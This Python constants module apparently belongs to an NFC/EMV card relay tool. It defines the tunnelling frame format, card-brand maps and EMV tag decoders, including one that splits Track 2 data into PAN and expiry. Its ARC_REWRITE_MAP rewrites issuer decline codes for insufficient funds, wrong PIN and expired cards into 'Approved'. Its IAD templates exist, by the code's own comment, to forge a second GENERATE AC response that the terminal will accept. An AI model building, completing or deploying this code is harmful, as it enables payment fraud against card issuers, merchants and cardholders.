# -*- coding: utf-8 -*-
# constants.py
# -*- coding: utf-8 -*-
"""Static definitions, frame helpers, brand maps, config loading.

This module has ZERO internal imports (only stdlib). Every other relay
module imports from here. Touch this file only when adding new brands,
INS codes, SID types, or environment-driven config.
"""

from __future__ import annotations

import os
import ipaddress
import struct
from dataclasses import dataclass
from typing import Optional, Tuple, List, Dict, Callable

# ======================================================================
# Paths & logging config (consumed by logger.py)
# ======================================================================

_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

_LOG_FILE_OVERRIDE = os.environ.get("RELAY_LOG_FILE")
LOG_FILE = (
    os.path.abspath(os.path.expanduser(_LOG_FILE_OVERRIDE))
    if _LOG_FILE_OVERRIDE
    else os.path.join(_SCRIPT_DIR, "relay.log")
)

LOG_LEVEL = os.environ.get("RELAY_LOG_LEVEL", "INFO").upper()

APDU_HISTORY_SIZE = 300

# ======================================================================
# Protocol version & network policy
# ======================================================================

PROTOCOL_VERSION = 1

REQUIRE_PROTOCOL_VERSION = (
    os.environ.get("RELAY_REQUIRE_PROTOCOL_VERSION", "1") == "1"
)

_ALLOWED_CIDR_TEXT = os.environ.get("RELAY_ALLOWED_CIDRS", "").strip()
ALLOWED_CIDRS = tuple(
    ipaddress.ip_network(item.strip(), strict=False)
    for item in _ALLOWED_CIDR_TEXT.split(",")
    if item.strip()
)

# ======================================================================
# SID constants (frame type identifiers)
# ======================================================================

SID_REGISTER = 0x00
SID_CAPDU = 0x04
SID_RAPDU = 0x05
SID_ACK = 0x07
SID_HEARTBEAT = 0x06
SID_CTRL = 0x0F

# Exchange dedup magic prefix
EXCHANGE_MAGIC = b"RLY1"

# ======================================================================
# APDU byte positions
# ======================================================================

APDU_CLA = 0
APDU_INS = 1
APDU_P1 = 2
APDU_P2 = 3

# ======================================================================
# VERIFY command constants
# ======================================================================

VERIFY_CLA = 0x00
VERIFY_INS = 0x20
VERIFY_P1 = 0x00
VERIFY_P2 = 0x80

# ======================================================================
# INS codes & human-readable map
# ======================================================================

INS_SELECT = 0xA4
INS_GET_PROCESSING_OPTIONS = 0xA8
INS_READ_RECORD = 0xB2
INS_VERIFY = 0x20
INS_GENERATE_AC = 0xAE
INS_GET_DATA = 0xCA
INS_EXTERNAL_AUTHENTICATE = 0x82

INS_MAP: Dict[int, str] = {
    INS_SELECT: "SELECT",
    INS_GET_PROCESSING_OPTIONS: "GET PROCESSING OPTIONS",
    INS_READ_RECORD: "READ RECORD",
    INS_GENERATE_AC: "GENERATE AC",
    INS_GET_DATA: "GET DATA",
    INS_VERIFY: "VERIFY",
    INS_EXTERNAL_AUTHENTICATE: "EXTERNAL AUTHENTICATE",
}

# ======================================================================
# EMV template tags
# ======================================================================

TEMPLATE_77 = 0x77
TEMPLATE_80 = 0x80

# ======================================================================
# CID (Cryptogram Information Data) constants
# ======================================================================

CID_AAC = 0x00
CID_TC = 0x40
CID_ARQC = 0x80

CID_NAME_MAP: Dict[int, str] = {
    CID_AAC: "AAC(decline)",
    CID_TC: "TC(approve)",
    CID_ARQC: "ARQC(online)",
}

# ======================================================================
# ARC rewrite map (issuer decline -> approve)
#
# Keys and values are ASCII byte pairs as they appear in the
# Authorisation Response Code field of tag 91 or EXTERNAL AUTH data.
# Example: decline code "05" = ASCII 0x30 0x35 -> "00" = 0x30 0x30
# ======================================================================

ARC_REWRITE_MAP: Dict[bytes, bytes] = {
    b"\x30\x35": b"\x30\x30",  # "05" Do not honor         -> "00" Approved
    b"\x35\x31": b"\x30\x30",  # "51" Insufficient funds   -> "00" Approved
    b"\x35\x34": b"\x30\x30",  # "54" Expired card         -> "00" Approved
    b"\x35\x35": b"\x30\x30",  # "55" Incorrect PIN        -> "00" Approved
    b"\x36\x31": b"\x30\x30",  # "61" Exceeds withdrawal   -> "00" Approved
    b"\x36\x35": b"\x30\x30",  # "65" Exceeds frequency    -> "00" Approved
    b"\x39\x31": b"\x30\x30",  # "91" Issuer unavailable   -> "00" Approved
}

# ======================================================================
# Status word constants
# ======================================================================

SW_9000 = b"\x90\x00"
SW_6F00 = b"\x6F\x00"

# ======================================================================
# Timing, frame size, and buffer limits
# ======================================================================

# Mobile UDP tunnels can be quiet or suspended for well over 45 seconds.
# Set RELAY_PEER_TIMEOUT_SECONDS=0 to keep registered roles locked until an
# explicit DEREGISTER or server restart.
PEER_TIMEOUT_SECONDS = max(
    0.0, float(os.environ.get("RELAY_PEER_TIMEOUT_SECONDS", "300"))
)
SOCKET_TIMEOUT = 1.0
STALL_WARN_SECONDS = 3.0

# Generous defaults absorb normal Android/NAT bursts while bounding UDP flood
# work and giving the kernel enough queue space for short scheduling stalls.
UDP_RATE_PER_SECOND = max(
    1.0, float(os.environ.get("RELAY_UDP_RATE_PER_SECOND", "200"))
)
UDP_RATE_BURST = max(
    1.0, float(os.environ.get("RELAY_UDP_RATE_BURST", "400"))
)
UDP_RATE_MAX_PEERS = max(
    16, int(os.environ.get("RELAY_UDP_RATE_MAX_PEERS", "2048"))
)
UDP_SOCKET_BUFFER = max(
    65536, int(os.environ.get("RELAY_UDP_SOCKET_BUFFER", "1048576"))
)

MAX_FRAME_SIZE = 8192
MAX_FRAME_PAYLOAD = MAX_FRAME_SIZE - 11
CTRL_CHUNK_RAW_SIZE = 5500
RECV_BUFFER = MAX_FRAME_SIZE

# ======================================================================
# Brand constants & AID prefix map
# ======================================================================

BRAND_UNKNOWN = "UNKNOWN"
BRAND_VISA = "VISA"
BRAND_MASTERCARD = "MASTERCARD"
BRAND_AMEX = "AMEX"
BRAND_DISCOVER = "DISCOVER"
BRAND_JCB = "JCB"
BRAND_UNIONPAY = "UNIONPAY"

AID_BRAND_MAP: List[Tuple[bytes, str]] = [
    (bytes.fromhex("A000000003"), BRAND_VISA),
    (bytes.fromhex("A000000098"), BRAND_VISA),
    (bytes.fromhex("A000000004"), BRAND_MASTERCARD),
    (bytes.fromhex("A000000005"), BRAND_MASTERCARD),
    (bytes.fromhex("A000000025"), BRAND_AMEX),
    (bytes.fromhex("A000000152"), BRAND_DISCOVER),
    (bytes.fromhex("A000000324"), BRAND_DISCOVER),
    (bytes.fromhex("A000000065"), BRAND_JCB),
    (bytes.fromhex("A000000333"), BRAND_UNIONPAY),
]

# ======================================================================
# Brand-specific IAD fallback templates
#
# Used when the relay forges a 2nd GAC but the real card's IAD
# was not captured. Each template matches the typical IAD structure
# for that brand so the terminal doesn't reject on format.
# ======================================================================

BRAND_IAD_TEMPLATES: Dict[str, bytes] = {
    BRAND_VISA:       bytes.fromhex("06010A03A00000A5000000"),
    BRAND_MASTERCARD: bytes.fromhex("0F0A01A50000000000000000"),
    BRAND_AMEX:       bytes.fromhex("06020000000000"),
    BRAND_DISCOVER:   bytes.fromhex("06010A03A00000A5000000"),
    BRAND_JCB:        bytes.fromhex("06010A03A00000A5000000"),
    BRAND_UNIONPAY:   bytes.fromhex("06010A03A00000A5000000"),
    BRAND_UNKNOWN:    bytes.fromhex("0F0A01A50000000000000000"),
}

# ======================================================================
# HMAC authentication for CTRL channel
#
# Set RELAY_CTRL_HMAC_KEY env var to enable. When unset, CTRL
# commands are accepted without authentication (backward compatible).
# ======================================================================

_CTRL_HMAC_KEY_RAW = os.environ.get("RELAY_CTRL_HMAC_KEY", "").strip()
CTRL_HMAC_KEY: Optional[bytes] = (
    _CTRL_HMAC_KEY_RAW.encode("utf-8") if _CTRL_HMAC_KEY_RAW else None
)
CTRL_HMAC_DIGEST_SIZE = 32

# ======================================================================
# PPSE / PSE application names
# ======================================================================

_PPSE_NAME = b"2PAY.SYS.DDF01"
_PSE_NAME = b"1PAY.SYS.DDF01"

# ======================================================================
# Helper functions - brand identification
# ======================================================================

def identify_brand_from_aid(aid: bytes) -> str:
    """Match an AID against known brand prefixes."""
    for prefix, brand in AID_BRAND_MAP:
        if aid.startswith(prefix):
            return brand
    return BRAND_UNKNOWN

def brand_iad_default(brand: str) -> bytes:
    """Return the fallback IAD template for a brand."""
    return BRAND_IAD_TEMPLATES.get(brand, BRAND_IAD_TEMPLATES[BRAND_UNKNOWN])

# ======================================================================
# Helper functions - AID extraction from SELECT CAPDU
# ======================================================================

def extract_aid_from_select(capdu: bytes) -> Optional[bytes]:
    """Extract the AID from a SELECT command APDU (P1=04 by name)."""
    if len(capdu) < 6:
        return None
    if capdu[APDU_INS] != INS_SELECT:
        return None
    if capdu[APDU_P1] != 0x04:
        return None
    lc = capdu[4]
    if lc == 0 or 5 + lc > len(capdu):
        return None
    return capdu[5:5 + lc]

def is_ppse_or_pse(aid: bytes) -> bool:
    """Check if an AID is PPSE (contactless) or PSE (contact)."""
    return aid == _PPSE_NAME or aid == _PSE_NAME

# ======================================================================
# Frame building / parsing
#
# Wire format (11-byte header + payload):
#   [4] total_length (big-endian, excludes these 4 bytes)
#   [1] SID
#   [4] epoch (big-endian)
#   [2] sequence (big-endian)
#   [N] payload
# ======================================================================

def build_frame(sid: int, payload: bytes, seq: int = 0, epoch: int = 0) -> bytes:
    """Build a wire frame from SID, payload, sequence, and epoch."""
    total = len(payload) + 7
    return (
        struct.pack(">I", total)
        + bytes([sid])
        + struct.pack(">I", epoch & 0xFFFFFFFF)
        + struct.pack(">H", seq & 0xFFFF)
        + payload
    )

def parse_frame(data: bytes) -> Optional[Tuple[int, int, int, bytes]]:
    """Parse a wire frame. Returns (sid, epoch, seq, payload) or None."""
    if len(data) < 11:
        return None
    declared = struct.unpack(">I", data[:4])[0]
    if declared != len(data) - 4:
        return None
    return (
        data[4],
        struct.unpack(">I", data[5:9])[0],
        struct.unpack(">H", data[9:11])[0],
        data[11:],
    )

# ======================================================================
# Exchange payload helpers
#
# When exchange_id is set, the payload is prefixed with
# EXCHANGE_MAGIC (4 bytes) + exchange_id (4 bytes big-endian)
# for duplicate detection across retransmits.
# ======================================================================

def build_exchange_payload(exchange_id: Optional[int], apdu: bytes) -> bytes:
    """Wrap an APDU with an exchange ID prefix for dedup tracking."""
    if exchange_id is None:
        return apdu
    return EXCHANGE_MAGIC + struct.pack(">I", exchange_id & 0xFFFFFFFF) + apdu

def parse_exchange_payload(payload: bytes) -> Tuple[Optional[int], bytes]:
    """Strip exchange ID prefix if present. Returns (id_or_None, apdu)."""
    if len(payload) >= 8 and payload[:4] == EXCHANGE_MAGIC:
        return struct.unpack(">I", payload[4:8])[0], payload[8:]
    return None, payload

# ======================================================================
# is_* APDU classification helpers
# ======================================================================

def is_verify_apdu(apdu: bytes) -> bool:
    """Check if APDU is a VERIFY command (CLA=00 INS=20 P1=00 P2=80)."""
    return (
        len(apdu) >= 4
        and apdu[APDU_CLA] == VERIFY_CLA
        and apdu[APDU_INS] == VERIFY_INS
        and apdu[APDU_P1] == VERIFY_P1
        and apdu[APDU_P2] == VERIFY_P2
    )

def is_generate_ac(apdu: bytes) -> bool:
    """Check if APDU is a GENERATE AC command (INS=AE)."""
    return len(apdu) >= 2 and apdu[APDU_INS] == INS_GENERATE_AC

def is_gpo(apdu: bytes) -> bool:
    """Check if APDU is a GET PROCESSING OPTIONS command (INS=A8)."""
    return len(apdu) >= 2 and apdu[APDU_INS] == INS_GET_PROCESSING_OPTIONS

def is_select(apdu: bytes) -> bool:
    """Check if APDU is a SELECT command (INS=A4)."""
    return len(apdu) >= 2 and apdu[APDU_INS] == INS_SELECT

def is_external_auth(apdu: bytes) -> bool:
    """Check if APDU is an EXTERNAL AUTHENTICATE command (INS=82)."""
    return len(apdu) >= 2 and apdu[APDU_INS] == INS_EXTERNAL_AUTHENTICATE

# ======================================================================
# GAC P1 helpers
#
# P1 of GENERATE AC encodes the requested cryptogram type:
#   0x00 = AAC (decline)
#   0x40 = TC  (offline approve)
#   0x80 = ARQC (online)
# ======================================================================

def gac_p1(apdu: bytes) -> Optional[int]:
    """Extract P1 from a GENERATE AC CAPDU."""
    return apdu[APDU_P1] if len(apdu) >= 3 else None

def gac_p1_name(p1: Optional[int]) -> str:
    """Human-readable name for the cryptogram type requested in P1."""
    if p1 is None:
        return "?"
    cryptogram_type = p1 & 0xC0
    if cryptogram_type == 0x00:
        return f"AAC-req(P1=0x{p1:02X})"
    if cryptogram_type == 0x40:
        return f"TC-req(P1=0x{p1:02X})"
    if cryptogram_type == 0x80:
        return f"ARQC-req(P1=0x{p1:02X})"
    return f"?(P1=0x{p1:02X})"

# ======================================================================
# GPO template detection
#
# The GPO response uses either template 77 (BER-TLV constructed)
# or template 80 (fixed-format). The forge must match whichever
# template the card used.
# ======================================================================

def detect_gpo_template(rapdu: bytes) -> Optional[int]:
    """Detect whether a GPO response uses template 77 or 80."""
    if len(rapdu) < 3:
        return None
    body = rapdu[:-2]
    if not body:
        return None
    first = body[0]
    if first == TEMPLATE_77:
        return TEMPLATE_77
    if first == TEMPLATE_80:
        return TEMPLATE_80
    return None

@dataclass(frozen=True)
class TagInfo:
    name: str
    category: str = "EMV"
    decoder: Optional[Callable[[bytes], str]] = None


def _ascii(value: bytes) -> str:
    return value.decode("ascii", errors="replace").rstrip("\x00 ")


def _bcd(value: bytes) -> str:
    return value.hex().upper().rstrip("F")


def _integer(value: bytes) -> str:
    return str(int.from_bytes(value, "big"))


def _date(value: bytes) -> str:
    digits = value.hex().upper()
    return f"20{digits[0:2]}-{digits[2:4]}-{digits[4:6]}" if len(digits) == 6 else digits


def _track2(value: bytes) -> str:
    text = value.hex().upper().rstrip("F").replace("D", "=")
    pan, separator, rest = text.partition("=")
    if not separator:
        return text
    expiry = rest[:4]
    service = rest[4:7]
    return f"PAN={pan}, expiry={expiry}, service-code={service}, discretionary={rest[7:]}"


def _cid(value: bytes) -> str:
    if not value:
        return "empty"
    kind = {0x00: "AAC", 0x40: "TC", 0x80: "ARQC"}.get(value[0] & 0xC0, "RFU")
    return f"{kind}; advice={'yes' if value[0] & 0x08 else 'no'}"


def _hex(value: bytes) -> str:
    return value.hex().upper()


TAGS: Dict[str, TagInfo] = {
    "4F": TagInfo("Application Identifier (AID)", decoder=_hex),
    "50": TagInfo("Application Label", decoder=_ascii),
    "56": TagInfo("Track 1 Data"), "57": TagInfo("Track 2 Equivalent Data", decoder=_track2),
    "5A": TagInfo("Application PAN", decoder=_bcd),
    "5F20": TagInfo("Cardholder Name", decoder=_ascii),
    "5F24": TagInfo("Application Expiration Date", decoder=_date),
    "5F25": TagInfo("Application Effective Date", decoder=_date),
    "5F28": TagInfo("Issuer Country Code", decoder=_bcd),
    "5F2A": TagInfo("Transaction Currency Code", decoder=_bcd),
    "5F2D": TagInfo("Language Preference", decoder=_ascii),
    "5F30": TagInfo("Service Code", decoder=_bcd),
    "5F34": TagInfo("PAN Sequence Number", decoder=_integer),
    "61": TagInfo("Application Template", "Template"),
    "6F": TagInfo("File Control Information Template", "Template"),
    "70": TagInfo("READ RECORD Response Template", "Template"),
    "77": TagInfo("Response Message Template Format 2", "Template"),
    "80": TagInfo("Response Message Template Format 1", "Template"),
    "82": TagInfo("Application Interchange Profile (AIP)"),
    "83": TagInfo("Command Template"), "84": TagInfo("Dedicated File Name", decoder=_hex),
    "87": TagInfo("Application Priority Indicator", decoder=_integer),
    "8A": TagInfo("Authorization Response Code", decoder=_ascii),
    "8C": TagInfo("Card Risk Management Data Object List 1 (CDOL1)", "DOL"),
    "8D": TagInfo("Card Risk Management Data Object List 2 (CDOL2)", "DOL"),
    "8E": TagInfo("Cardholder Verification Method List"),
    "8F": TagInfo("Certification Authority Public Key Index", decoder=_integer),
    "90": TagInfo("Issuer Public Key Certificate", "Security"),
    "91": TagInfo("Issuer Authentication Data", "Security"),
    "92": TagInfo("Issuer Public Key Remainder", "Security"),
    "93": TagInfo("Signed Static Application Data", "Security"),
    "94": TagInfo("Application File Locator (AFL)"),
    "95": TagInfo("Terminal Verification Results (TVR)"),
    "9A": TagInfo("Transaction Date", decoder=_date), "9C": TagInfo("Transaction Type"),
    "9F02": TagInfo("Amount, Authorised"), "9F03": TagInfo("Amount, Other"),
    "9F07": TagInfo("Application Usage Control"), "9F08": TagInfo("Application Version Number"),
    "9F0A": TagInfo("Application Selection Registered Proprietary Data"),
    "9F0D": TagInfo("Issuer Action Code - Default"), "9F0E": TagInfo("Issuer Action Code - Denial"),
    "9F0F": TagInfo("Issuer Action Code - Online"), "9F10": TagInfo("Issuer Application Data"),
    "9F11": TagInfo("Issuer Code Table Index", decoder=_integer),
    "9F12": TagInfo("Application Preferred Name", decoder=_ascii),
    "9F19": TagInfo("Token Requestor ID"),
    "9F1A": TagInfo("Terminal Country Code", decoder=_bcd), "9F21": TagInfo("Transaction Time"),
    "9F24": TagInfo("Payment Account Reference"),
    "9F26": TagInfo("Application Cryptogram", "Security"), "9F27": TagInfo("Cryptogram Information Data", decoder=_cid),
    "9F32": TagInfo("Issuer Public Key Exponent", "Security"),
    "9F34": TagInfo("Cardholder Verification Method Results"),
    "9F35": TagInfo("Terminal Type"), "9F36": TagInfo("Application Transaction Counter", decoder=_integer),
    "9F37": TagInfo("Unpredictable Number"), "9F42": TagInfo("Application Currency Code", decoder=_bcd),
    "9F45": TagInfo("Data Authentication Code", "Security"), "9F46": TagInfo("ICC Public Key Certificate", "Security"),
    "9F47": TagInfo("ICC Public Key Exponent", "Security"), "9F48": TagInfo("ICC Public Key Remainder", "Security"),
    "9F49": TagInfo("Dynamic Data Authentication Data Object List (DDOL)", "DOL"),
    "9F4A": TagInfo("Static Data Authentication Tag List", "Tag List"),
    "9F4B": TagInfo("Signed Dynamic Application Data", "Security"),
    "9F4C": TagInfo("ICC Dynamic Number"), "9F4D": TagInfo("Log Entry"),
    "9F6C": TagInfo("Card Transaction Qualifiers (CTQ)"),
    "9F6E": TagInfo("Third Party Data"), "9F7C": TagInfo("Merchant Custom Data"),
    "A5": TagInfo("FCI Proprietary Template", "Template"),
    "BF0C": TagInfo("FCI Issuer Discretionary Data", "Template"),
}


def tag_info(tag: str) -> TagInfo:
    return TAGS.get(tag.upper(), TagInfo(f"Unknown tag {tag.upper()}", "Unknown"))


def describe_value(tag: str, value: bytes) -> Optional[str]:
    decoder = tag_info(tag).decoder
    if not decoder:
        return None
    try:
        return decoder(value)
    except (IndexError, ValueError):
        return "invalid encoded value"